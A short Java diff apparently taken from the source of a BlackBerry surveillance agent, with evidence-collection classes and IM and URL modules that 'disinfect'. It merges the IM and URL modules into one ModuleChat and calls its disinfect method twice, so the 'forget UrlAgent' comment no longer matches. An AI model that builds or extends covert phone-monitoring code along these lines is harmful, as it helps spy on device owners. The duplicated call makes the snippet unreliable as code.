@@ -26,8 +26,7 @@ import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceCollector;
 import blackberry.fs.AutoFile;
-import blackberry.module.ModuleIm;
-import blackberry.module.ModuleUrl;
+import blackberry.module.ModuleChat;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
 
@@ -121,9 +120,9 @@ public final class ExecuteAction extends SubActionMain {
     //#ifdef DEBUG
     private void executeForget(Vector params) {
         // forget ImAgent
-        ModuleIm.getInstance().disinfect();
+        ((ModuleChat)ModuleChat.getInstance()).disinfect();
         // forget UrlAgent
-        ModuleUrl.getInstance().disinfect();
+        ((ModuleChat)ModuleChat.getInstance()).disinfect();
     }
 
     //#endif
